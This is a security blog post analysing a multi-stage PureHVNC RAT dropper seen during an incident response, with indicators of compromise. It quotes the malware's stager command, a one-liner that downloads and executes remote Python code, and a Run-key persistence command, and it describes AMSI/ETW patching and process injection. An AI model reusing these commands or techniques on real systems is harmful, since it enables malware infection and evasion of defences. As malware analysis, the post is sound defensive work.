<!DOCTYPE html><html lang="en" mode="light" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer" /><meta property="og:locale" content="en" /><meta name="description" content="Intro This piece of malware was spotted in one of the incident for which I led the response. It was executed, undetected by Defender for Endpoint and garned a full fledged IR investigation. I will not mention the whole IR process as this focuses more on the analysis of the dropper which was a multi-stage heavily obfucated python script &amp; C# binary. To give more context to it. It was a PXAStealer attack as seen on SentinelOne. SentinelOne focused more on the PXAStealer(DLL) aspect, whereas this one is a later step in the infection chain leading to persistence. All the IoCs will be mentioned in the appendix." /><meta property="og:description" content="Intro This piece of malware was spotted in one of the incident for which I led the response. It was executed, undetected by Defender for Endpoint and garned a full fledged IR investigation. I will not mention the whole IR process as this focuses more on the analysis of the dropper which was a multi-stage heavily obfucated python script &amp; C# binary. To give more context to it. It was a PXAStealer attack as seen on SentinelOne. SentinelOne focused more on the PXAStealer(DLL) aspect, whereas this one is a later step in the infection chain leading to persistence. All the IoCs will be mentioned in the appendix." /><link rel="canonical" href="https://ra2302.github.io/posts/Seven-PureHVNC-Dropper/" /><meta property="og:url" content="https://ra2302.github.io/posts/Seven-PureHVNC-Dropper/" /><meta property="og:site_name" content="Ra-Sec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-08-06T01:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer" /><meta name="twitter:site" content="@Ra16848771" /><meta name="google-site-verification" content="ERfD-xPJRqtpaqqpL8aef9xqeMy-42eAa0FCL-tluwg" /> <script type="application/ld+json"> {"headline":"Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer","dateModified":"2025-08-21T20:36:42+05:30","datePublished":"2025-08-06T01:00:00+05:30","description":"Intro This piece of malware was spotted in one of the incident for which I led the response. It was executed, undetected by Defender for Endpoint and garned a full fledged IR investigation. I will not mention the whole IR process as this focuses more on the analysis of the dropper which was a multi-stage heavily obfucated python script &amp; C# binary. To give more context to it. It was a PXAStealer attack as seen on SentinelOne. SentinelOne focused more on the PXAStealer(DLL) aspect, whereas this one is a later step in the infection chain leading to persistence. All the IoCs will be mentioned in the appendix.","mainEntityOfPage":{"@type":"WebPage","@id":"https://ra2302.github.io/posts/Seven-PureHVNC-Dropper/"},"url":"https://ra2302.github.io/posts/Seven-PureHVNC-Dropper/","@type":"BlogPosting","@context":"https://schema.org"}</script><title>Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer | Ra-Sec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ra-Sec"><meta name="application-name" content="Ra-Sec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ra-Sec</a></div><div class="site-subtitle font-italic">欢迎来到我的网站!</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ra2302" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Ra16848771" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ramneek2302','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Ra2302 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Aug 6, 2025, 1:00 AM +0530" >Aug 6<i class="unloaded">2025-08-06T01:00:00+05:30</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Thu, Aug 21, 2025, 8:36 PM +0530" >Aug 21<i class="unloaded">2025-08-21T20:36:42+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1597 words">8 min read</span></div></div><div class="post-content"><h2 id="intro">Intro</h2><p>This piece of malware was spotted in one of the incident for which I led the response. It was executed, undetected by Defender for Endpoint and garned a full fledged IR investigation. I will not mention the whole IR process as this focuses more on the analysis of the dropper which was a multi-stage heavily obfucated python script &amp; C# binary.<br /> To give more context to it. It was a PXAStealer attack as seen on <a href="https://www.sentinelone.com/labs/ghost-in-the-zip-new-pxa-stealer-and-its-telegram-powered-ecosystem/">SentinelOne</a>. SentinelOne focused more on the PXAStealer(DLL) aspect, whereas this one is a later step in the infection chain leading to persistence. All the IoCs will be mentioned in the appendix.</p><h3 id="how-we-got-here">How we got here?</h3><p>The user received a phishing link on their personal email address and opened it on their corporate device and it started the infection. It originated through a .lnk file which is consistent with previous PureHVNC and PXAStealer infections. The .lnk file included a obfuscated script which initiated the download of a master zip archive.<br /> That was followed by the creation more zip archives with .pdf extension which originated from master zip file and were extracted. Python launcher, malicious dll(PXAStealer) and all dependencies were extracted from the zip archives in the “C:\Users\Public\Windows" directory and once the DLL was sideloaded into MS Word binary, it executed the below mentioned command and which in turn exectued python script in memory. I can’t share the screenshots or more information as it might contain senstive information. From the very beginning, the attack happened mainly through memory only. Here’s the initial stager command from the sideloaded DLL.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cmd /c cd "" &amp;&amp; start "Google Ads Playbook.docx" &amp;&amp; certutil -decode Document.pdf Invoice.pdf &amp;&amp; images.png x -ibck -y -poX3ff7b6Bfi76keXy3xmSWnX0uqsFYur Invoice.pdf C:\\Users\\Public &amp;&amp; del /s /q Document.pdf &amp;&amp; del /s /q Invoice.pdf &amp;&amp; del /s /q images.png &amp;&amp; del /s /q "Contract Invoice.docx" &amp;&amp; del /s /q "Evidence Report.docx" &amp;&amp; cd C:\\Users\\Public\\Windows &amp;&amp; start svchost.exe Lib\\images.png MR_Q_NEW_VER_BOT &amp;&amp; exit &amp;&amp; exit
</pre></table></code></div></div><p>Sadly I can’t share the info on the very initial payload which initated the download due to undisclosable reason hence, the lack of information in this step. But the silver lining is that we have the actual malicious payload and we know the methodology followed by the stager. Let’s begin with the actual payload. All the IOCs will be mentioned in the appendix.</p><h3 id="initial-script">Initial script</h3><p>The initial payload is a python script which is executed in memory with the following command</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>svchost.exe -c "import.requests;exec(requests.get('hXXp://0x0[.]st/8nyT.py').txt)"
</pre></table></code></div></div><p>That syntax oddly looks like python execution. Upon checking the hash of this extracted svchost, it was confirmed to be a normal python executable only.</p><p>Here’s a small snippet of the script, it has strange function definitions and one huge chunk of encrypted text.<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/initial_script.png" alt="Initial_script" /></p><p>It is base85 encoded, zlib compressed and a marshal code. I wrote a quick script to decode it.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>import base64, zlib
with open("weird.txt", "r") as f:
    b85_data = f.read().strip()
decoded = base64.b85decode(b85_data)
decompressed = zlib.decompress(decoded)
with open("decompressed.bin", "wb") as f:
    f.write(decompressed)
</pre></table></code></div></div><p>This small script left us with marshal code. Since marshal code can only be decompiled with the python version it was written in, it took a little bit of hit and trial and with the help uncompyle6 and python 3.8.18 it was decoded.</p><h3 id="second-stage">Second Stage</h3><p>After following the decryption routine of the first script and decompiling the marshal code, the second script is visible.<br /> The second script also follows a similar footprint but with a lot more rigorous encryption. There is base85, zlib, AES, xor, RSA and a custom rc4 decryption routine. A private key is also included. <br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/second_payload_decryptor.png" alt="Second_Decryption_Routine" /></p><p>This the decryptor function &amp; exec function <br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/Second_decryptor.png" alt="Second_Decryptor" /></p><p>To decrypt the payload from this script, the most convenient way is to use the existing decrytion function. In this instance it was quite troublesome to get the marshal code to decompile like earlier method, so I opted to extract the python bytecode disassembly.</p><p><img data-proofer-ignore data-src="/assets/purehvnc-dropper/disassembler.png" alt="Disassembler" /></p><p>The decompiled bytecode gave quite a lot of information including the info on the target executable, which is RegAsm.exe. There are two payloads, one is a portable executable and second one is a shellcode. Before we dig into these, let’s take a look at this script.<br /> This is a full-fledged process injection script with custom RC4 decryption logic. Both the payloads, PE &amp; Shellcode use different keys for decryption. It first creates a suspended RegAsm.exe and attempts to inject the PE into it. If that fails it injects the shellcode payload into it’s own process (svchost.exe or rather pythonw.exe in this case) and executes it. For the sake of readability, the screenshots are of the <em>python code generated from the bytecode</em>.</p><p>Custom RC4 and PE injection function. <br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/rc4_injection_routine.png" alt="rc4_injection" /></p><p>Fallback Shellcode injection function. <br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/Fallback_selfinjection.png" alt="fallback" /></p><h3 id="third-stage">Third Stage</h3><p>Now it is time to move on from the python scripts. After base64 decode and RC4 decryption with my own script, It reveals two payloads</p><ul><li>C# PE (Which is injected into RegAsm.exe)<li>Donut Shellcode (Which is the failsafe method if the PE injection fails)</ul><p>Both are the same payloads just primary and failsafe delivery methods.<br /> Here will start with the C# file which is our normal .NET executable.</p><p><img data-proofer-ignore data-src="/assets/purehvnc-dropper/DetectitEasy_1.png" alt="DIE_1" /></p><p>When looking it under CFF explorer, there is some unusual data.<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/CFF.png" alt="CFF" /></p><p>It turned out to be another base64 payload. Which is much more evident when the file is explored in dnSpy.<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/dnspy_1.png" alt="wdckghr_crypted" /><br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/dnspy_2.png" alt="wdckghr_crypted_2" /></p><p>It also reveals that the original file name is Wdckghr_crypted. It hold one key and one base64 and xor’ed text. And it attempts to use textbook methods to patch AMSI &amp; ETW to seemless script execution.<br /> AMSI<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/PatchAMSI.png" alt="AMSIPatch" /><br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/AMSI_Payload.png" alt="AMSIPayload" /></p><p>These functions collect the address of AMSI buffer in memory &amp; patches the AMSI in such a way that it will always return 0x80070057(64-bit), which is the error code for invalid argument.</p><p>ETW<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/PatchETW.png" alt="ETWPatch" /><br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/ETWPayload.png" alt="ETWPayload" /></p><p>Similarly these collect the address of ETWEventWrite in memory &amp; patches the ETW so that function will just “return”(Decoded payload - “C3”) and do nothing.</p><p>Below are the functions responsible for decoding and executing the next steps</p><p><img data-proofer-ignore data-src="/assets/purehvnc-dropper/fun1.png" alt="function1" /><br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/fun2.png" alt="function2" /></p><p>One small python script later, we have the next stage executable.</p><h3 id="fourth-stage">Fourth Stage</h3><p>Similar to the previous stage, it is another C# file. Just in this case, instead of a long base64 string, we have a byte array and the original name of the file is Sydxj.exe.</p><p><img data-proofer-ignore data-src="/assets/purehvnc-dropper/DIE2.png" alt="DetectItEZ" /> <br /> This is .Net Reactor obfucated file but we don’t really need to know about it much as it just follows a decryption routine, nothing else.</p><p>The main function is simply calling the MeasureSpec() which in turn is responsible for decoding the byte array.</p><p><img data-proofer-ignore data-src="/assets/purehvnc-dropper/dnspy_2File_1.png" alt="Main" /><br /> Drcryptor function <br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/dnspy_2File_2.png" alt="Decryptor_Function" /><br /> Byte array<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/dnspy_2File_bytecode.png" alt="Byte_array" /></p><p>As seen in the decryptor function, It call the function mentioned below which passes the execution to the final payload by call the function “PopSetStack()”. <br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/dnspy_2File_nextpayload.png" alt="handover_Function" /></p><p>To decode the byte array, I simply decided to patch the MeasureSpec() and modify it to dump the code instead of passing the execution to the next stage.<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/modified_spec.png" alt="modified_Spec" /></p><p>And voila! We have final stage payload.</p><h3 id="final-stage">Final stage</h3><p>The final payload is a DLL file, which is once again written in C#, making it “semi” easier to analyse.<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/final_dll1.png" alt="DLL_PE" /> <br /> Once again this dll is protected by .NET Reactor obfuscator by <a href="https://www.eziriz.com/dotnet_reactor.htm">Eziriz</a> which makes trying to read it normally exponentially hard. But luckily there is a tool call .<a href="https://github.com/SychicBoy/NETReactorSlayer">NET Reactor Slayer</a> which made is super simple to deobfuscate and read with dnspy.<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/net_reactor.png" alt="Net Reactor" /></p><p>Jumping straight into the PopSetStack() function as it was seen being called by the previous stage.<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/popset.png" alt="called_Funtion" /> <br /> This function simply calls another function(RequestAttachedClient()) which is responsible for initiating and maintaining a connection to the C2 server as seen below.</p><p><img data-proofer-ignore data-src="/assets/purehvnc-dropper/RequestAttachedClient1.png" alt="RequestAttachedClient1" /><br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/RequestAttachClient2.png" alt="RequestAttachedClient2" /><br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/RequestAttachedClient3.png" alt="RequestAttachedClient3" /></p><p>In short what the function is doing maintaining proper communication with the C2 and if the communication breaks, it attempts to reconnect.</p><p>This whole function is a loop executed with the help of labels.</p><ul><li>RequestCombinedClient() is used to extract C2 details and Cert and it saves it to containerSummarizer<li>SendDetachedClient() is basically a flag. If it is set to be true, it means that the connection is established and it will be actively listening/reading information from C2 under the label IL_02DA. If it is set to false it will go to label IL_007F and retry connection<li>Under the label IL_007F it disposes all the variables set like previous SSLStream, Timer(matcherClient) and basically resets connection.<li>I will not be going into the depths of the all functions seen here but the gist is there</ul><p>To gather the C2 information, there another base64 and Gzip compressed text.<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/cert.png" alt="cert function" /></p><p>One quick run to the <a href="https://gchq.github.io/CyberChef/">CyberChef platform</a> and we have the C2 information and a certificate.<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/c2.png" alt="C2" /></p><p>Processing it with OpenSSL, it gives out valuable information<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/cert_head.png" alt="Cert_header" /></p><p>If you’ve noticed there doesn’t seem to be any kind of execution happening. After proper analysis of the other functions, it seems to be quite a modular RAT. It appears to be collecting other modules, binaries and/or commands from the C2 after the initial connection. The data which it receives is gzip compressed, which is decompressed by TokenizeBasicSingleton() through JoinAuthorizer(). <img data-proofer-ignore data-src="/assets/purehvnc-dropper/Tokenizer_Actual_C2_Commands_Decoder.png" alt="JoinAuthorize" /></p><p>One more important thing - It uses protobuf library to deserialize data from C2.</p><p><img data-proofer-ignore data-src="/assets/purehvnc-dropper/deserialize_overview.png" alt="Deserialize_Overview" /></p><p>It stores unique fingerprint of the infected system in “SOFTWARE//{runtime-generated-data}” registry<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/Get_Strategy.png" alt="Key Stored" /><br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/DisconnectResponsiveChain.png" alt="Fingerprint Generated" /><br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/Reg_key_SS.png" alt="Registry" /></p><p>For persistence, it adds the very initial stager command in the HKCU{User SID}\Software\Microsoft\Windows\CurrentVersion\Run</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cmd /c start C:\Users\Public\Windows\svchost.exe C:\Users\Public\Windows\Lib\images.png MR_Q_NEW_VER_BOT
</pre></table></code></div></div><p>The mutex for this variant is “def” and it checks for this mutex before execution. <br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/mutex.png" alt="mutex" /></p><p>Below are a couple of screenshots from wireshark. One with internet enabled and one without.<br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/On_internet_wireshark.png" alt="with internet" /><br /> <img data-proofer-ignore data-src="/assets/purehvnc-dropper/Off_Internet_wireshark.png" alt="without internet" /></p><h3 id="appendix">Appendix</h3><h4 id="iocs">IOCs</h4><p>Hashes -<br /> 61c0515c70a2b451d3d59f9450e5bd060f73290214ae6a6990db6adc04d534a7 - Initial lnk file<br /> 6a51160fd443d4ddf69e0424d494e12436fbe0898756eeae6c79c77718760516 - Sideloaded DLL(PXAStealer) <br /> 96637bc629ca866ab5aa176e7ccb3cff9f93c8f9d021520a97f527bfa9d56d7e - Wdckhgr_crypted - First stage after python execution<br /> 289c09d43faaae05702f477f648dfd336085983f8253f834acd24960469335b7 - Donut shellcode<br /> 5baa860a2ee10bc859f527c686ec8f25b74860fe5d0f9138f8c7aeeb8dade7f4 - Sydxj - Intermediary stage<br /> cb783c1e27455f90fdd558d2a10604e35f830b7a07e0d820d3e2b49f17d1f787 - Sctgvth - Final DLL</p><p>C2 -<br /> 162[.]218[.]115[.]218 (Connected on remote port 5600X)</p><p>Certificate Fingerprint - <br /> SHA1 Fingerprint=CA:08:3A:47:C9:D5:C5:9B:FA:33:AB:56:97:8E:4D:1F:7B:5B:00:17</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/days-of-security/'>Days of Security</a>, <a href='/categories/reverse-engineering/'>Reverse Engineering</a>, <a href='/categories/incident-response/'>Incident Response</a>, <a href='/categories/malware-analysis/'>Malware Analysis</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/malware-analysis/" class="post-tag no-text-decoration" >Malware Analysis</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer - Ra-Sec&url=https://ra2302.github.io/posts/Seven-PureHVNC-Dropper/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer - Ra-Sec&u=https://ra2302.github.io/posts/Seven-PureHVNC-Dropper/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer - Ra-Sec&url=https://ra2302.github.io/posts/Seven-PureHVNC-Dropper/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Seven-PureHVNC-Dropper/">Seven - Malware Analysis - Multi-Stage PureHVNC RAT - Part of PXAStealer</a><li><a href="/posts/Six-Linux-Forensics-IronShade/">Six - TryHackMe - IronShade Linux Forensics Challenge</a><li><a href="/posts/Four-Diskrupt-THM/">Four - TryHackMe - Diskrupt Forensics Challenge</a><li><a href="/posts/Two-PCAP-Analysis/">Two - LetsDefend - PCAP Analysis Challenge</a><li><a href="/posts/One-Kioptrix-1/">One - Kioptrix 1 Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/privlege-escalation/">privlege-escalation</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/digital-forensics/">Digital Forensics</a> <a class="post-tag" href="/tags/malware-analysis/">Malware Analysis</a> <a class="post-tag" href="/tags/basics/">basics</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/getcap/">getcap</a> <a class="post-tag" href="/tags/john/">john</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Three-ImageExfil-PMAT/"><div class="card-body"> <span class="timeago small" >Nov 2, 2024<i class="unloaded">2024-11-02T01:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Three - PMAT Lab - Bonus Binary Malware Analysis</h3><div class="text-muted small"><p> Intro So with my time being completely MIA and being lazy, I just want to mention that I was learning Malware Analysis and I have gained somewhat of a foothold in the same. This blog is just to hig...</p></div></div></a></div><div class="card"> <a href="/posts/Four-Diskrupt-THM/"><div class="card-body"> <span class="timeago small" >Jul 13<i class="unloaded">2025-07-13T01:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Four - TryHackMe - Diskrupt Forensics Challenge</h3><div class="text-muted small"><p> Intro Diskrupt is a hard difficulty digital forensics challenge. The main objective is to fix the damaged disk, analyse the file system, and recover the deleted files. There are 12 questions as par...</p></div></div></a></div><div class="card"> <a href="/posts/One-Kioptrix-1/"><div class="card-body"> <span class="timeago small" >Feb 10, 2024<i class="unloaded">2024-02-10T22:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>One - Kioptrix 1 Writeup</h3><div class="text-muted small"><p> Intro Kioptrix 1 is a boot2root style box, where the main objective is to gain root access on the machine in any way possible. For this machine, we don’t get any flags to flaunt. Enumeration To ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Six-Linux-Forensics-IronShade/" class="btn btn-outline-primary" prompt="Older"><p>Six - TryHackMe - IronShade Linux Forensics Challenge</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/Ra16848771">Ra2302</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/privlege-escalation/">privlege escalation</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/digital-forensics/">Digital Forensics</a> <a class="post-tag" href="/tags/malware-analysis/">Malware Analysis</a> <a class="post-tag" href="/tags/basics/">basics</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/getcap/">getcap</a> <a class="post-tag" href="/tags/john/">john</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 